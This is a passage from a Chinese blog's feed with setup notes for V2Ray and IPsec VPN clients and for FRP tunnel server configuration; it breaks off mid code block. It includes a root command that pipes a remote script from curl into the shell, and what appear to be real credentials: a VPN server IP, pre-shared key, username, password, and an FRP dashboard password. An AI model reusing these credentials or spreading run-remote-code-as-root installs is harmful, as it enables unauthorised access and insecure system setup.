github.com</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2020年7月27日整理发布多种GitHub加速方式！&lt;/p&gt;
&lt;h2 id=&quot;1-GitHub-镜像访问&quot;&gt;&lt;a href=&quot;#1-GitHub-镜像访问&quot; class=&quot;headerlink&quot; title=&quot;1. GitHub 镜像访问&quot;&gt;&lt;/a&gt;1. GitHub 镜</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    <category term="翻墙" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E7%BF%BB%E5%A2%99/"/>
    
    
  </entry>
  
  <entry>
    <title>翻墙工具环境配置</title>
    <link href="https://seniortesting.club/posts/KlIMmnE6tI/"/>
    <id>https://seniortesting.club/posts/KlIMmnE6tI/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Github-翻墙速度提升"><a href="#Github-翻墙速度提升" class="headerlink" title="Github 翻墙速度提升"></a>Github 翻墙速度提升</h2><p><a href="https://code.seniortesting.club/blog/2020/How-To-Speed-Github.html" target="_blank" rel="noopener">https://code.seniortesting.club/blog/2020/How-To-Speed-Github.html</a></p><h2 id="V2Ray"><a href="#V2Ray" class="headerlink" title="V2Ray"></a>V2Ray</h2><h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><p>2020/04/15： 推荐采用一键配置脚本，支持多用户<a href="https://github.com/Jrohy/multi-v2ray" target="_blank" rel="noopener">Github仓库multi-v2ray</a></p><p>安装步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -s</span><br><span class="line">$ source &lt;(curl -sL https:&#x2F;&#x2F;multi.netlify.com&#x2F;v2ray.sh) --zh</span><br></pre></td></tr></table></figure><h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><ul><li><p><a href="/2020/vultr-setup">自己整理的V2rayN配置操作说明</a></p></li><li><p><a href="https://www.hijk.pw/v2rayn-config-tutorial/" target="_blank" rel="noopener">Windows-V2rayN配置教程</a></p></li><li><p><a href="https://www.hijk.pw/v2rayw-config-tutorial/" target="_blank" rel="noopener">V2rayW配置教程</a></p></li></ul><h2 id="IPsec-L2TP客户端配置，目前采用v2ray"><a href="#IPsec-L2TP客户端配置，目前采用v2ray" class="headerlink" title="IPsec/L2TP客户端配置，目前采用v2ray"></a><del>IPsec/L2TP客户端配置，目前采用v2ray</del></h2><p><strong>注：</strong> 你也可以使用 <a href="clients-zh.md">IPsec/L2TP 模式</a> 连接，无需安装额外的软件。</p><ol><li><p>下载并安装免费的 <a href="https://www.shrew.net/download/vpn" target="_blank">Shrew Soft VPN 客户端</a>。<br><strong>注：</strong> 该 VPN 客户端支持 Windows 2K/XP/Vista/7/8 系统。</p></li><li><p>安装提示操作安装完成即可。   </p></li><li><p>单击开始菜单 -&gt; 所有程序 -&gt; ShrewSoft VPN Client -&gt; VPN Access Manager</p></li><li><p>单击工具栏中的 <strong>Add (+)</strong> 按钮。<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200309115224.png" alt="20200309115224.png"></p></li><li><p>在 <strong>Host Name or IP Address</strong> 字段中输入<code>你的 VPN 服务器 IP</code>： 34.69.204.193<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200309115336.png" alt="20200309115336.png"></p></li><li><p>单击 <strong>Authentication</strong> 选项卡，从 <strong>Authentication Method</strong> 下拉菜单中选择 <strong>Mutual PSK + XAuth</strong>。</p></li><li><p>在 <strong>Local Identity</strong> 子选项卡中，从 <strong>Identification Type</strong> 下拉菜单中选择 <strong>IP Address</strong>。<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200309115935.png" alt="20200309115935.png"></p></li><li><p>单击 <strong>Credentials</strong> 子选项卡，并在 <strong>Pre Shared Key</strong> 字段中输入<code>你的 VPN IPsec PSK</code>： <strong>55e76a3d2285ee1264998ue9597b6f383a978ed6b</strong><br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200309120528.png" alt="20200309120528.png"></p></li><li><p>单击 <strong>Phase 1</strong> 选项卡，从 <strong>Exchange Type</strong> 下拉菜单中选择 <strong>main</strong>。</p></li><li><p>单击 <strong>Phase 2</strong> 选项卡，从 <strong>HMAC Algorithm</strong> 下拉菜单中选择 <strong>sha1</strong>。</p></li><li><p>单击 <strong>Save</strong> 保存 VPN 连接的详细信息。</p></li><li><p>选择新添加的 VPN 连接。单击工具栏中的 <strong>Connect</strong> 按钮。</p></li><li><p>在 <strong>Username</strong> 字段中输入<code>你的 VPN 用户名</code>: <strong>alterhu2020</strong></p></li><li><p>在 <strong>Password</strong> 字段中输入<code>你的 VPN 密码</code>: <strong>1235674378778</strong></p></li><li><p>单击 <strong>Connect</strong></p></li></ol><h2 id="V2Ray一键安装脚本"><a href="#V2Ray一键安装脚本" class="headerlink" title="V2Ray一键安装脚本"></a>V2Ray一键安装脚本</h2><p><a href="https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC" target="_blank" rel="noopener"><del>V2Ray一键安装脚本</del></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Github-翻墙速度提升&quot;&gt;&lt;a href=&quot;#Github-翻墙速度提升&quot; class=&quot;headerlink&quot; title=&quot;Github 翻墙速度提升&quot;&gt;&lt;/a&gt;Github 翻墙速度提升&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://code.seni</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    <category term="翻墙" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E7%BF%BB%E5%A2%99/"/>
    
    
  </entry>
  
  <entry>
    <title>FRP内网穿透环境配置</title>
    <link href="https://seniortesting.club/posts/PoLuowtkQ1/"/>
    <id>https://seniortesting.club/posts/PoLuowtkQ1/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h2><h2 id="frps-ini配置文件"><a href="#frps-ini配置文件" class="headerlink" title="frps.ini配置文件"></a><code>frps.ini</code>配置文件</h2><ol><li>配置执行文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frps</span><br></pre></td></tr></table></figure><ol start="2"><li>直接修改<code>frps.ini</code>配置文件内容如下:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">bind_udp_port &#x3D; 7001</span><br><span class="line"># kcp_bind_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vhost_http_port &#x3D; 8080</span><br><span class="line">vhost_https_port &#x3D; 4443</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log_file &#x3D; &#x2F;opt&#x2F;frp_0.31.1_linux_amd64&#x2F;logs&#x2F;frps.log</span><br><span class="line">log_level &#x3D; info</span><br><span class="line">log_max_days &#x3D; 3</span><br><span class="line"></span><br><span class="line">custom_404_page &#x3D; &#x2F;opt&#x2F;frp_0.31.1_linux_amd64&#x2F;HTTP404.html</span><br><span class="line"></span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pwd &#x3D; xxtestd231lx0)</span><br><span class="line"></span><br><span class="line"># subdomain_host &#x3D; seniortesting.club</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置全局404错误页面"><a href="#配置全局404错误页面" class="headerlink" title="配置全局404错误页面"></a>配置全局404错误页面</h3><p>文件名为: <code>http404.html</code>,代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- Simple HttpErrorPages | MIT License | https:&#x2F;&#x2F;github.com&#x2F;AndiDittrich&#x2F;HttpErrorPages --&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;非法操作请求 | 404 - 没有找到资源&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">      &#x2F;*! normalize.css v5.0.0 | MIT License | github.com&#x2F;necolas&#x2F;normalize.css *&#x2F;</span><br><span class="line">      html &#123;</span><br><span class="line">        font-family: sans-serif;</span><br><span class="line">        line-height: 1.15;</span><br><span class="line">        -ms-text-size-adjust: 100%;</span><br><span class="line">        -webkit-text-size-adjust: 100%;</span><br><span class="line">      &#125;</span><br><span class="line">      body &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">      &#125;</span><br><span class="line">      article,</span><br><span class="line">      aside,</span><br><span class="line">      footer,</span><br><span class="line">      header,</span><br><span class="line">      nav,</span><br><span class="line">      section &#123;</span><br><span class="line">        display: block;</span><br><span class="line">      &#125;</span><br><span class="line">      h1 &#123;</span><br><span class="line">        font-size: 2em;</span><br><span class="line">        margin: 0.67em 0;</span><br><span class="line">      &#125;</span><br><span class="line">      figcaption,</span><br><span class="line">      figure,</span><br><span class="line">      main &#123;</span><br><span class="line">        display: block;</span><br><span class="line">      &#125;</span><br><span class="line">      figure &#123;</span><br><span class="line">        margin: 1em 40px;</span><br><span class="line">      &#125;</span><br><span class="line">      hr &#123;</span><br><span class="line">        box-sizing: content-box;</span><br><span class="line">        height: 0;</span><br><span class="line">        overflow: visible;</span><br><span class="line">      &#125;</span><br><span class="line">      pre &#123;</span><br><span class="line">        font-family: monospace, monospace;</span><br><span class="line">        font-size: 1em;</span><br><span class="line">      &#125;</span><br><span class="line">      a &#123;</span><br><span class="line">        background-color: transparent;</span><br><span class="line">        -webkit-text-decoration-skip: objects;</span><br><span class="line">      &#125;</span><br><span class="line">      a:active,</span><br><span class="line">      a:hover &#123;</span><br><span class="line">        outline-width: 0;</span><br><span class="line">      &#125;</span><br><span class="line">      abbr[title] &#123;</span><br><span class="line">        border-bottom: none;</span><br><span class="line">        text-decoration: underline;</span><br><span class="line">        text-decoration: underline dotted;</span><br><span class="line">      &#125;</span><br><span class="line">      b,</span><br><span class="line">      strong &#123;</span><br><span class="line">        font-weight: inherit;</span><br><span class="line">      &#125;</span><br><span class="line">      b,</span><br><span class="line">      strong &#123;</span><br><span class="line">        font-weight: bolder;</span><br><span class="line">      &#125;</span><br><span class="line">      code,</span><br><span class="line">      kbd,</span><br><span class="line">      samp &#123;</span><br><span class="line">        font-family: monospace, monospace;</span><br><span class="line">        font-size: 1em;</span><br><span class="line">      &#125;</span><br><span class="line">      dfn &#123;</span><br><span class="line">        font-style: italic;</span><br><span class="line">      &#125;</span><br><span class="line">      mark &#123;</span><br><span class="line">        background-color: #ff0;</span><br><span class="line">        color: #000;</span><br><span class="line">      &#125;</span><br><span class="line">      small &#123;</span><br><span class="line">        font-size: 80%;</span><br><span class="line">      &#125;</span><br><span class="line">      sub,</span><br><span class="line">      sup &#123;</span><br><span class="line">        font-size: 75%;</span><br><span class="line">        line-height: 0;</span><br><span class="line">        position: relative;</span><br><span class="line">        vertical-align: baseline;</span><br><span class="line">      &#125;</span><br><span class="line">      sub &#123;</span><br><span class="line">        bottom: -0.25em;</span><br><span class="line">      &#125;</span><br><span class="line">      sup &#123;</span><br><span class="line">        top: -0.5em;</span><br><span class="line">      &#125;</span><br><span class="line">      audio,</span><br><span class="line">      video &#123;</span><br><span class="line">        display: inline-block;</span><br><span class="line">      &#125;</span><br><span class="line">      audio:not([controls]) &#123;</span><br><span class="line">        display: none;</span><br><span class="line">        height: 0;</span><br><span class="line">      &#125;</span><br><span class="line">      img &#123;</span><br><span class="line">        border-style: none;</span><br><span class="line">      &#125;</span><br><span class="line">      svg:not(:root) &#123;</span><br><span class="line">        overflow: hidden;</span><br><span class="line">      &#125;</span><br><span class="line">      button,</span><br><span class="line">      input,</span><br><span class="line">      optgroup,</span><br><span class="line">      select,</span><br><span class="line">      textarea &#123;</span><br><span class="line">        font-family: sans-serif;</span><br><span class="line">        font-size: 100%;</span><br><span class="line">        line-height: 1.15;</span><br><span class="line">        margin: 0;</span><br><span class="line">      &#125;</span><br><span class="line">      button,</span><br><span class="line">      input &#123;</span><br><span class="line">        overflow: visible;</span><br><span class="line">      &#125;</span><br><span class="line">      button,</span><br><span class="line">      select &#123;</span><br><span class="line">        text-transform: none;</span><br><span class="line">      &#125;</span><br><span class="line">      [type&#x3D;&quot;reset&quot;],</span><br><span class="line">      [type&#x3D;&quot;submit&quot;],</span><br><span class="line">      button,</span><br><span class="line">      html [type&#x3D;&quot;button&quot;] &#123;</span><br><span class="line">        -webkit-appearance: button;</span><br><span class="line">      &#125;</span><br><span class="line">      [type&#x3D;&quot;button&quot;]::-moz-focus-inner,</span><br><span class="line">      [type&#x3D;&quot;reset&quot;]::-moz-focus-inner,</span><br><span class="line">      [type&#x3D;&quot;submit&quot;]::-moz-focus-inner,</span><br><span class="line">      button::-moz-focus-inner &#123;</span><br><span class="line">        border-style: none;</span><br><span class="line">        padding: 0;</span><br><span class="line">      &#125;</span><br><span class="line">      [type&#x3D;&quot;button&quot;]:-moz-focusring,</span><br><span class="line">      [type&#x3D;&quot;reset&quot;]:-moz-focusring,</span><br><span class="line">      [type&#x3D;&quot;submit&quot;]:-moz-focusring,</span><br><span class="line">      button:-moz-focusring &#123;</span><br><span class="line">        outline: 1px dotted ButtonText;</span><br><span class="line">      &#125;</span><br><span class="line">      fieldset &#123;</span><br><span class="line">        border: 1px solid silver;</span><br><span class="line">        margin: 0 2px;</span><br><span class="line">        padding: 0.35em 0.625em 0.75em;</span><br><span class="line">      &#125;</span><br><span class="line">      legend &#123;</span><br><span class="line">        box-sizing: border-box;</span><br><span class="line">        color: inherit;</span><br><span class="line">        display: table;</span><br><span class="line">        max-width: 100%;</span><br><span class="line">        padding: 0;</span><br><span class="line">        white-space: normal;</span><br><span class="line">      &#125;</span><br><span class="line">      progress &#123;</span><br><span class="line">        display: inline-block;</span><br><span class="line">        vertical-align: baseline;</span><br><span class="line">      &#125;</span><br><span class="line">      textarea &#123;</span><br><span class="line">        overflow: auto;</span><br><span class="line">      &#125;</span><br><span class="line">      [type&#x3D;&quot;checkbox&quot;],</span><br><span class="line">      [type&#x3D;&quot;radio&quot;] &#123;</span><br><span class="line">        box-sizing: border-box;</span><br><span class="line">        padding: 0;</span><br><span class="line">      &#125;</span><br><span class="line">      [type&#x3D;&quot;number&quot;]::-webkit-inner-spin-button,</span><br><span class="line">      [type&#x3D;&quot;number&quot;]::-webkit-outer-spin-button &#123;</span><br><span class="line">        height: auto;</span><br><span class="line">      &#125;</span><br><span class="line">      [type&#x3D;&quot;search&quot;] &#123;</span><br><span class="line">        -webkit-appearance: textfield;</span><br><span class="line">        outline-offset: -2px;</span><br><span class="line">      &#125;</span><br><span class="line">      [type&#x3D;&quot;search&quot;]::-webkit-search-cancel-button,</span><br><span class="line">      [type&#x3D;&quot;search&quot;]::-webkit-search-decoration &#123;</span><br><span class="line">        -webkit-appearance: none;</span><br><span class="line">      &#125;</span><br><span class="line">      ::-webkit-file-upload-button &#123;</span><br><span class="line">        -webkit-appearance: button;</span><br><span class="line">        font: inherit;</span><br><span class="line">      &#125;</span><br><span class="line">      details,</span><br><span class="line">      menu &#123;</span><br><span class="line">        display: block;</span><br><span class="line">      &#125;</span><br><span class="line">      summary &#123;</span><br><span class="line">        display: list-item;</span><br><span class="line">      &#125;</span><br><span class="line">      canvas &#123;</span><br><span class="line">        display: inline-block;</span><br><span class="line">      &#125;</span><br><span class="line">      template &#123;</span><br><span class="line">        display: none;</span><br><span class="line">      &#125;</span><br><span class="line">      [hidden] &#123;</span><br><span class="line">        display: none;</span><br><span class="line">      &#125; &#x2F;*! Simple HttpErrorPages | MIT X11 License | https:&#x2F;&#x2F;github.com&#x2F;AndiDittrich&#x2F;HttpErrorPages *&#x2F;</span><br><span class="line">      body,</span><br><span class="line">      html &#123;</span><br><span class="line">        width: 100%;</span><br><span class="line">        height: 100%;</span><br><span class="line">        background-color: #21232a;</span><br><span class="line">      &#125;</span><br><span class="line">      body &#123;</span><br><span class="line">        color: #fff;</span><br><span class="line">        text-align: center;</span><br><span class="line">        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);</span><br><span class="line">        padding: 0;</span><br><span class="line">        min-height: 100%;</span><br><span class="line">        -webkit-box-shadow: inset 0 0 100px rgba(0, 0, 0, 0.8);</span><br><span class="line">        box-shadow: inset 0 0 100px rgba(0, 0, 0, 0.8);</span><br><span class="line">        display: table;</span><br><span class="line">        font-family: &quot;Open Sans&quot;, Arial, sans-serif;</span><br><span class="line">      &#125;</span><br><span class="line">      h1 &#123;</span><br><span class="line">        font-family: inherit;</span><br><span class="line">        font-weight: 500;</span><br><span class="line">        line-height: 1.1;</span><br><span class="line">        color: inherit;</span><br><span class="line">        font-size: 36px;</span><br><span class="line">      &#125;</span><br><span class="line">      h1 small &#123;</span><br><span class="line">        font-size: 68%;</span><br><span class="line">        font-weight: 400;</span><br><span class="line">        line-height: 1;</span><br><span class="line">        color: #777;</span><br><span class="line">      &#125;</span><br><span class="line">      a &#123;</span><br><span class="line">        text-decoration: none;</span><br><span class="line">        color: #fff;</span><br><span class="line">        font-size: inherit;</span><br><span class="line">        border-bottom: dotted 1px #707070;</span><br><span class="line">      &#125;</span><br><span class="line">      .lead &#123;</span><br><span class="line">        color: silver;</span><br><span class="line">        font-size: 21px;</span><br><span class="line">        line-height: 1.4;</span><br><span class="line">      &#125;</span><br><span class="line">      .cover &#123;</span><br><span class="line">        display: table-cell;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">        padding: 0 20px;</span><br><span class="line">      &#125;</span><br><span class="line">      footer &#123;</span><br><span class="line">        position: fixed;</span><br><span class="line">        width: 100%;</span><br><span class="line">        height: 40px;</span><br><span class="line">        left: 0;</span><br><span class="line">        bottom: 0;</span><br><span class="line">        color: #a0a0a0;</span><br><span class="line">        font-size: 14px;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;cover&quot;&gt;</span><br><span class="line">      &lt;h1&gt;没有找到资源 &lt;small&gt;错误代码: 404&lt;&#x2F;small&gt;&lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;p class&#x3D;&quot;lead&quot;&gt;</span><br><span class="line">          当前访问的资源没有找到，您可以稍后尝试访问该资源查看是否存在！</span><br><span class="line">        &lt;!-- The requested resource could not be found but may be available again in</span><br><span class="line">        the future. --&gt;</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置开机启动服务"><a href="#配置开机启动服务" class="headerlink" title="配置开机启动服务"></a>配置开机启动服务</h3><p>开机启动脚本文件是: <code>frps.service</code>,复制到目录: <code>/lib/systemd/system</code>,代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Frp Server Service</span><br><span class="line">After&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">User&#x3D;root</span><br><span class="line">Restart&#x3D;on-failure</span><br><span class="line">RestartSec&#x3D;5s</span><br><span class="line">ExecStart&#x3D;&#x2F;opt&#x2F;frp_0.31.1_linux_amd64&#x2F;frps -c &#x2F;opt&#x2F;frp_0.31.1_linux_amd64&#x2F;frps.ini</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><h2 id="frpc-ini配置文件"><a href="#frpc-ini配置文件" class="headerlink" title="frpc.ini配置文件"></a><code>frpc.ini</code>配置文件</h2><ol><li>配置执行文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br></pre></td></tr></table></figure><ol start="2"><li>直接修改<code>frpc.ini</code>配置文件内容如下:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 